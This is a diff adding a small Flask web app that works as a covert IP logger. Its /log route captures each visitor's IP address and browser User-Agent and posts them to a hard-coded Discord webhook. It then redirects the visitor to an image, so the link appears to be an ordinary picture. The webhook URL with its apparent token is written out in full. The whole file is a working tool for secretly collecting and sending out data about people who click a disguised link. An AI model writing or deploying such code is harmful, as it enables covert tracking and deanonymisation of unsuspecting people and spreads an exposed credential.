@@ -1,0 +1,18 @@
+from flask import Flask, request, redirect, Response
+import requests
+
+app = Flask(__name__)
+
+WEBHOOK = "https://discord.com/api/webhooks/1506122380609720390/KtiAgpewzZHsYscE0O8rm6KuXbilnDUxzHoTQq4_o-BKgI17EK4NGxFWFqwO-T0KEXPP"
+IMAGE_URL = "https://i.pinimg.com/originals/fd/9d/6c/fd9d6c58250e85c4192c0032f24e12ce.jpg"
+
+@app.route('/log')
+def log():
+    ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
+    ua = request.headers.get('User-Agent', '')
+    try:
+        requests.post(WEBHOOK, json={"content": f"IP: {ip}\nUA: {ua}"})
+    except:
+        pass
+    # Redirect to the static image
+    return redirect(IMAGE_URL)
